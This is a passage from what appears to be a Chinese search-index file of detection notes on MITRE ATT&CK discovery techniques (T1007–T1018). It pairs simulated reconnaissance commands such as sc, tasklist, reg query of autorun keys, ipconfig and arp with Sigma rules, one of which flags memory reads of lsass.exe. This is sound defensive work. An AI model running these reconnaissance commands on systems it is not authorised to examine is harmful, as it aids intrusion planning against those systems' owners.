Application\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1007-win-%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows \u5b89\u5168\u65e5\u5fd7\u3001\u8fdb\u7a0b\u521b\u5efa\u3001\u8fdb\u7a0b\u5173\u95ed\u3001\u547d\u4ee4\u884c\u53c2\u6570\u7b49</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1007-win-%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1007-win-%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: windows \u7cfb\u7edf\u670d\u52a1\u53d1\u73b0\ndescription: windows server 2016\nreferences:\ntags: T1007\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002\n        Newprocessname: 'C:\\Windows\\System32\\sc.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u65b0\u8fdb\u7a0b\u540d\u79f0\n        Creatorprocessname: 'C:\\windows\\system32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0\n        Processcommandline: SC * #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8fdb\u7a0b\u547d\u4ee4\u884c\n    condition: selection\nlevel: medium\n</code></pre> <pre><code>title: windows \u7cfb\u7edf\u670d\u52a1\u53d1\u73b0\ndescription: windows server 2016\nreferences:\ntags: T1007\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n        EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002\n        Newprocessname: 'C:\\Windows\\System32\\tasklist.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u65b0\u8fdb\u7a0b\u540d\u79f0\n        Creatorprocessname: 'C:\\Windows\\System32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0\n        Processcommandline: tasklist  * #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8fdb\u7a0b\u547d\u4ee4\u884c\n    selection2: # *5\n        EventID: 4703 #\u4e00\u4e2a\u7528\u6237\u7684\u6743\u9650\u88ab\u8c03\u6574\u3002\n        ProcessName: 'C:\\Windows\\System32\\whoami.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8fdb\u7a0b\u540d\n        EnabledPrivileges: 'SeDebugPrivilege' #\u542f\u7528\u7684\u6743\u9650\n    selection3:\n        EventID: 4690 #\u8bd5\u56fe\u5c06\u53e5\u67c4\u590d\u5236\u5230\u5bf9\u8c61\u3002\n    selection4:\n        EventID: 4658 #\u5df2\u5173\u95ed\u5230\u5bf9\u8c61\u7684\u53e5\u67c4\u3002\n        ProcessName: 'C:\\Windows\\System32\\wbem\\WmiPrvSE.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8fdb\u7a0b\u540d\n    selection5:\n        EventID: 4656 #\u5df2\u8bf7\u6c42\u5230\u5bf9\u8c61\u7684\u53e5\u67c4\u3002\n        Objectname: '\\Device\\HarddiskVolume4\\Windows\\System32\\lsass.exe' #\u5bf9\u8c61&gt;\u5bf9\u8c61\u540d\n        ProcessName: 'C:\\Windows\\System32\\wbem\\WmiPrvSE.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8fdb\u7a0b\u540d\n    selection6:\n        EventID: 4633 #\u8bd5\u56fe\u8bbf\u95ee\u5bf9\u8c61\u3002\n        Objectname: '\\Device\\HarddiskVolume4\\Windows\\System32\\lsass.exe' #\u5bf9\u8c61&gt;\u5bf9\u8c61\u540d\n        ProcessName: 'C:\\Windows\\System32\\wbem\\WmiPrvSE.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8fdb\u7a0b\u540d\n        Access: \u8bfb\u53d6\u8fdb\u7a0b\u5185\u5b58 #\u8bbf\u95ee\u8bf7\u6c42\u4fe1\u606f&gt;\u8bbf\u95ee\n    selection7:\n        EventID: 4658 #\u5df2\u5173\u95ed\u5230\u5bf9\u8c61\u7684\u53e5\u67c4\u3002\n        ProcessName: 'C:\\Windows\\System32\\wbem\\WmiPrvSE.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8fdb\u7a0b\u540d\n    selection8:\n        EventID: 4689 #\u5df2\u9000\u51fa\u8fdb\u7a0b\n        ProcessName: 'C:\\Windows\\System32\\tasklist.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8fdb\u7a0b\u540d\n        Exitstatus: 0x0 #\u8fdb\u7a0b\u4fe1\u606f&gt;\u9000\u51fa\u72b6\u6001\n    timeframe: last 1m #\u53ef\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8c03\u6574\n    condition: all of them\nlevel: medium\n</code></pre> <pre><code>title: windows \u7cfb\u7edf\u670d\u52a1\u53d1\u73b0\ndescription: windows server 2016\nreferences:\ntags: T1007\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n        EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002\n        Newprocessname: 'C:\\Windows\\System32\\net.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u65b0\u8fdb\u7a0b\u540d\u79f0\n        Creatorprocessname: 'C:\\windows\\system32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0\n        Processcommandline: net  start #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8fdb\u7a0b\u547d\u4ee4\u884c\n    selection2:\n        EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002\n        Newprocessname: 'C:\\Windows\\System32\\net1.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u65b0\u8fdb\u7a0b\u540d\u79f0\n        Creatorprocessname: 'C:\\Windows\\System32\\net.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0\n        Processcommandline: C:\\Windows\\system32\\net1  start #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8fdb\u7a0b\u547d\u4ee4\u884c\n    selection3:\n        EventID: 4689 #\u5df2\u9000\u51fa\u8fdb\u7a0b\n        ProcessName: 'C:\\Windows\\System32\\net1.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8fdb\u7a0b\u540d\n    selection4:\n        EventID: 4689 #\u5df2\u9000\u51fa\u8fdb\u7a0b\n        ProcessName: 'C:\\Windows\\System32\\net.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8fdb\u7a0b\u540d\n    timeframe: last 1m #\u53ef\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8c03\u6574\n    condition: all of them\nlevel: medium\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1007-win-%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0/#_6","title":"\u5efa\u8bae","text":"<p>\u7cfb\u7edf\u670d\u52a1\u53d1\u73b0\u65b9\u6cd5\u6709\u5f88\u591a\uff0c\u4e0d\u80fd\u4e00\u4e00\u5217\u4e3e\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1007-win-%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1007</p> <p>https://attack.mitre.org/techniques/T1007/</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1010-win-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%AA%97%E5%8F%A3%E5%8F%91%E7%8E%B0/","title":"T1010-win-\u5e94\u7528\u7a0b\u5e8f\u7a97\u53e3\u53d1\u73b0","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1010-win-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%AA%97%E5%8F%A3%E5%8F%91%E7%8E%B0/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u83b7\u53d6\u6253\u5f00\u7684\u5e94\u7528\u7a0b\u5e8f\u7a97\u53e3\u7684\u5217\u8868\u3002\u7a97\u53e3\u5217\u8868\u53ef\u4ee5\u4f20\u8fbe\u6709\u5173\u5982\u4f55\u4f7f\u7528\u7cfb\u7edf\u7684\u4fe1\u606f\uff0c\u4e5f\u53ef\u4ee5\u4e3a\u952e\u76d8\u8bb0\u5f55\u7a0b\u5e8f\u6536\u96c6\u7684\u4fe1\u606f\u63d0\u4f9b\u4e0a\u4e0b\u6587\u3002</p> <p>\u5728Mac\u4e2d\uff0c\u53ef\u4ee5\u4f7f\u7528\u5c0f\u7684AppleScript\u811a\u672c\u672c\u673a\u5b8c\u6210\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1010-win-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%AA%97%E5%8F%A3%E5%8F%91%E7%8E%B0/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>Windows server 2016\u6a21\u62df\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u53d1\u73b0\u6b63\u5728\u8fd0\u884c\u7684\u5e94\u7528\u7a0b\u5e8f\u7a97\u53e3\u3002</p> <pre><code>get-process | where-object {$_.mainwindowtitle -ne \"\"} | Select-Object mainwindowtitle\n</code></pre> <p>\u901a\u8fc7COM\u65b9\u6cd5\u83b7\u53d6\u5e94\u7528\u7a0b\u5e8f\u7a97\u53e3\uff0c\u8fd8\u5305\u62ec\u8fc7\u7a0b\u8def\u5f84\u548c\u7a97\u53e3\u4f4d\u7f6e\u5750\u6807\uff1a</p> <pre><code>[activator]::CreateInstance([type]::GetTypeFromCLSID(\"13709620-C279-11CE-A49E-444553540000\")).windows()\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1010-win-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%AA%97%E5%8F%A3%E5%8F%91%E7%8E%B0/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>Windows powershell\u65e5\u5fd7\uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u4f60\u9700\u8981\u5f00\u542fpowershell\u5ba1\u6838\u7b56\u7565\uff0c\u4f4e\u7248\u672cpowershell\u65e0\u6cd5\u5bf9\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\uff09</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1010-win-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%AA%97%E5%8F%A3%E5%8F%91%E7%8E%B0/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1010-win-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%AA%97%E5%8F%A3%E5%8F%91%E7%8E%B0/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1010-win-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%AA%97%E5%8F%A3%E5%8F%91%E7%8E%B0/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1010-win-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%AA%97%E5%8F%A3%E5%8F%91%E7%8E%B0/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: windows\u672c\u5730\u6267\u884cPowershell\u547d\u4ee4\uff0c\u679a\u4e3e\u5e94\u7528\u7a0b\u5e8f\u7a97\u53e3\ndescription: windows server 2016\nreferences: \u6682\u65e0\ntags: T1010\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: powershell\ndetection:\n    selection:\n        EventID: 4104 #\u6267\u884c\u8fdc\u7a0b\u547d\u4ee4\n        message:\n          - 'get-process | where-object {$_.mainwindowtitle -ne \"\"} | Select-Object mainwindowtitle'  #\u57fa\u4e8e\u547d\u4ee4\u884c\u53c2\u6570\u68c0\u6d4b\uff0c\u68c0\u51fa\u7387\u8f83\u4f4e\n          - [activator]::CreateInstance([type]::GetTypeFromCLSID(\"13709620-C279-11CE-A49E-444553540000\")).windows() #\u57fa\u4e8e\u547d\u4ee4\u884c\u53c2\u6570\u68c0\u6d4b\uff0c\u68c0\u51fa\u7387\u8f83\u4f4e\n    condition: selection\nlevel: low\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1010-win-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%AA%97%E5%8F%A3%E5%8F%91%E7%8E%B0/#_6","title":"\u5efa\u8bae","text":"<p>\u5f53\u653b\u51fb\u8005\u4e86\u89e3\u73af\u5883\u65f6\uff0c\u7cfb\u7edf\u548c\u7f51\u7edc\u53d1\u73b0\u6280\u672f\u901a\u5e38\u4f1a\u5728\u6574\u4e2a\u64cd\u4f5c\u4e2d\u51fa\u73b0\u3002\u4e0d\u5e94\u5b64\u7acb\u5730\u770b\u5f85\u6570\u636e\u548c\u4e8b\u4ef6\uff0c\u800c\u5e94\u5c06\u5176\u89c6\u4e3a\u884c\u4e3a\u94fe\u7684\u4e00\u90e8\u5206\uff0c\u8fd9\u4e9b\u884c\u4e3a\u53ef\u80fd\u5bfc\u81f4\u57fa\u4e8e\u6240\u83b7\u53d6\u4fe1\u606f\u7684\u5176\u4ed6\u6d3b\u52a8\u3002</p> <p>\u76d1\u89c6\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\u4ee5\u4e86\u89e3\u53ef\u4ee5\u91c7\u53d6\u54ea\u4e9b\u63aa\u65bd\u6765\u6536\u96c6\u7cfb\u7edf\u548c\u7f51\u7edc\u4fe1\u606f\u3002\u5177\u6709\u5185\u7f6e\u529f\u80fd\u7684\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u4e0eWindows API\u4ea4\u4e92\u4ee5\u6536\u96c6\u4fe1\u606f\u3002\u4e5f\u53ef\u4ee5\u901a\u8fc7Windows\u7cfb\u7edf\u7ba1\u7406\u5de5\u5177\uff08\u4f8b\u5982Windows Management Instrumentation\u548cPowerShell\uff09\u6765\u83b7\u53d6\u4fe1\u606f\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1010-win-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%AA%97%E5%8F%A3%E5%8F%91%E7%8E%B0/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1010</p> <p>https://attack.mitre.org/techniques/T1010/</p> <p>\u5e94\u7528\u7a0b\u5e8f\u7a97\u53e3\u53d1\u73b0</p> <p>https://ired.team/offensive-security/enumeration-and-discovery/t1010-application-window-discovery</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1012-win-%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%86%8C%E8%A1%A8/","title":"T1012-win-\u67e5\u8be2\u6ce8\u518c\u8868","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1012-win-%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%86%8C%E8%A1%A8/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u4ee5\u4e0eWindows\u6ce8\u518c\u8868\u4ea4\u4e92\uff0c\u4ee5\u6536\u96c6\u6709\u5173\u7cfb\u7edf\u3001\u914d\u7f6e\u548c\u5df2\u5b89\u88c5\u8f6f\u4ef6\u7684\u4fe1\u606f\u3002 \u6ce8\u518c\u8868\u5305\u542b\u5927\u91cf\u6709\u5173\u64cd\u4f5c\u7cfb\u7edf\u3001\u914d\u7f6e\u3001\u8f6f\u4ef6\u548c\u5b89\u5168\u6027\u7684\u4fe1\u606f\u3002\u4e00\u4e9b\u4fe1\u606f\u53ef\u80fd\u6709\u52a9\u4e8e\u653b\u51fb\u8005\u5728\u7f51\u7edc\u4e2d\u8fdb\u4e00\u6b65\u5f00\u5c55\u884c\u52a8\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u81ea\u52a8\u53d1\u73b0\u671f\u95f4\u4f7f\u7528\u67e5\u8be2\u6ce8\u518c\u8868\u4e2d\u7684\u4fe1\u606f\u6765\u5851\u9020\u540e\u7eed\u884c\u4e3a\uff0c\u5305\u62ec\u653b\u51fb\u8005\u662f\u5426\u5b8c\u5168\u611f\u67d3\u76ee\u6807\u6216\u5c1d\u8bd5\u7279\u5b9a\u64cd\u4f5c\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1012-win-%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%86%8C%E8%A1%A8/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>Windows server 2016\u6a21\u62dfBabyShark\u6267\u884c\u6267\u884c\u7684reg query HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\u547d\u4ee4\u3002\u7531\u4e8e\u7f3a\u5c11\u76f8\u5e94\u7684\u6837\u672c\uff0c\u672c\u6d4b\u8bd5\u6848\u4f8b\u5229\u7528CMD\u7a97\u53e3\u6a21\u62df\u4ee5\u4e0a\u547d\u4ee4\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1012-win-%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%86%8C%E8%A1%A8/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>Windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1012-win-%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%86%8C%E8%A1%A8/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<pre><code>C:\\Users\\Administrator&gt;reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /ve\n\u9519\u8bef: \u7cfb\u7edf\u627e\u4e0d\u5230\u6307\u5b9a\u7684\u6ce8\u518c\u8868\u9879\u6216\u503c\u3002\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1012-win-%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%86%8C%E8%A1%A8/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows \u5b89\u5168\u65e5\u5fd7\uff0c\u8fdb\u7a0b\u521b\u5efa\u3001\u5b50\u7236\u8fdb\u7a0b\u3001\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570 </p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1012-win-%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%86%8C%E8%A1%A8/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1012-win-%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%86%8C%E8%A1%A8/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: windows\u672c\u5730\u6267\u884creg query HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\ndescription: windows server 2016\nreferences: \n        - https://github.com/redcanaryco/atomic-red-team/blob/910a2a764a66b0905065d8bdedb04b37049a85db/atomics/T1012/T1012.md\ntags: T1012\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4688 #\u8fdb\u7a0b\u521b\u5efa\n        Newprocessname: 'C:\\Windows\\System32\\reg.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u65b0\u8fdb\u7a0b\u540d\u79f0\n        Creatorprocessname: 'C:\\Windows\\System32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0\n        Processcommandline: \n                 - reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"\n                 - reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\n                 - reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\n                 - reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\n                 - reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\n                 - reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"\n                 - reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"\n                 - reg query \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\n                 - reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\n                 - reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\n                 - reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n                 - reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\n                 - reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n                 - reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n                 - reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n                 - reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\n                 - reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\n                 - reg query HKLM\\system\\currentcontrolset\\services /s | findstr ImagePath 2&gt;nul | findstr /Ri \".*\\.sys$\"\n                 - reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n         #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8fdb\u7a0b\u547d\u4ee4\u884c\uff0c\u5b9e\u9645\u60c5\u51b5\u4e0b\uff0c\u4f60\u53ef\u4ee5\u5bf9\u4efb\u4f55\u6ce8\u518c\u8868\u67e5\u8be2\u884c\u4e3a\u8fdb\u884c\u68c0\u6d4b\n    condition: selection\nlevel: low\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1012-win-%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%86%8C%E8%A1%A8/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1012-win-%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%86%8C%E8%A1%A8/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1012</p> <p>https://attack.mitre.org/techniques/T1012/</p> <p>Windows\u4e0breg\u547d\u4ee4\u8be6\u89e3</p> <p>https://www.jb51.net/article/30078.htm</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1016-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E5%8F%91%E7%8E%B0/","title":"T1016-win-\u7cfb\u7edf\u7f51\u7edc\u914d\u7f6e\u53d1\u73b0","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1016-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E5%8F%91%E7%8E%B0/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5bfb\u627e\u6709\u5173\u5176\u8bbf\u95ee\u7684\u7cfb\u7edf\u6216\u901a\u8fc7\u8fdc\u7a0b\u7cfb\u7edf\u7684\u4fe1\u606f\u53d1\u73b0\u7684\u7f51\u7edc\u914d\u7f6e\u548c\u8bbe\u7f6e\u7684\u8be6\u7ec6\u4fe1\u606f\u3002\u5b58\u5728\u51e0\u4e2a\u53ef\u7528\u4e8e\u6536\u96c6\u6b64\u4fe1\u606f\u7684\u64cd\u4f5c\u7cfb\u7edf\u7ba1\u7406\u5b9e\u7528\u7a0b\u5e8f\u3002\u793a\u4f8b\u5305\u62ecArp\uff0cipconfig /ifconfig\uff0cnbtstat\u548croute\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1016-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E5%8F%91%E7%8E%B0/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>windows\u4e0b\u6267\u884cArp\uff0cipconfig\uff0cnbtstat\u548croute\u547d\u4ee4</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1016-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E5%8F%91%E7%8E%B0/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1016-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E5%8F%91%E7%8E%B0/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6682\u65e0</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1016-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E5%8F%91%E7%8E%B0/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1016-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E5%8F%91%E7%8E%B0/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1016-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E5%8F%91%E7%8E%B0/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: windows \u7cfb\u7edf\u7f51\u7edc\u914d\u7f6e\u53d1\u73b0\ndescription: windows server 2016\nreferences:\n        - https://github.com/redcanaryco/atomic-red-team/blob/910a2a764a66b0905065d8bdedb04b37049a85db/atomics/T1016/T1016.md\ntags: T1016\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security/sysmon\ndetection:\n    selection:\n        EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002\n        CommandLine:\n               - ipconfig /all\n               - netsh interface show interface\n               - arp -a\n               - nbtstat -n\n               - net config\n               - netsh advfirewall firewall show rule name=all\nlevel: medium\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1016-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E5%8F%91%E7%8E%B0/#_6","title":"\u5efa\u8bae","text":"<p>\u5982\u679c\u4f60\u90e8\u7f72\u4e86sysmon\uff0c\u4f60\u4e5f\u53ef\u4ee5\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\uff0c\u5f53\u7136\uff0c\u5176\u4ed6\u5177\u5907\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\u7684\u529f\u80fd\u7684EDR\u4e5f\u53ef\u4ee5\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1016-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E5%8F%91%E7%8E%B0/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1016</p> <p>https://attack.mitre.org/techniques/T1016/</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E6%A3%80%E6%B5%8Bnbtscan%E6%B4%BB%E5%8A%A8/","title":"T1018-win-\u68c0\u6d4bnbtscan\u6d3b\u52a8","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E6%A3%80%E6%B5%8Bnbtscan%E6%B4%BB%E5%8A%A8/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u901a\u8fc7IP\u5730\u5740\uff0c\u4e3b\u673a\u540d\u6216\u7f51\u7edc\u4e0a\u5176\u4ed6\u53ef\u7528\u4e8e\u4ece\u5f53\u524d\u7cfb\u7edf\u8fdb\u884c\u6a2a\u5411\u79fb\u52a8\u7684\u903b\u8f91\u6807\u8bc6\u7b26\u6765\u83b7\u53d6\u5176\u4ed6\u7cfb\u7edf\u7684\u5217\u8868\u3002\u8fdc\u7a0b\u8bbf\u95ee\